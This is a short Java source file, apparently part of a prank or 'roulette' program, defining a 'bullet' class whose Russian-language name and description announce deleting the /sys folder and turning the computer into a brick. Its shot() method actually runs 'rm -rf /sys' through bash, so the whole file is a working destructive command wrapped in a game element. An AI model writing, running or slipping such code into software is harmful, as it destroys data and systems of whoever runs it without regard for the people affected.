package bullets;

import lombok.Getter;

import java.io.IOException;

@Getter
public class RmRfSys implements Bullet {
    String name = "Удаление папки /sys";
    String description = "Полностью превращает ваш компьютер в кирпич";

    @Override
    public void shot() throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder("bash", "-c",
                "rm -rf /sys");

        processBuilder.start();
    }
}